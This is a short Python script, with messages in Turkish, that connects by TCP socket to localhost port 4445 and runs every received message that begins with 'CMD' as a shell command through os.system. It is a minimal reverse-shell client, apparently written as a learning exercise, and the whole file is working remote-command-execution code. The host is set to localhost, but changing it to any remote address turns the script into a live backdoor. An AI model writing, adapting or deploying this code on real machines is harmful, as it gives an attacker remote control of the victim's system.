from http.client import responses
import socket
import os


HOST = "localhost"
PORT = 4445

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST, PORT))
print(f"{HOST}'a {PORT} port'undan baglanildi.")
try:
    while True:
        response = s.recv(1024)
        responseDecode = response.decode("utf-8")
        if responseDecode.startswith("CMD"):
            os.system(responseDecode[3::])
        else:
            print(responseDecode)
except Exception as msg:
    print("[Hata !] ", msg)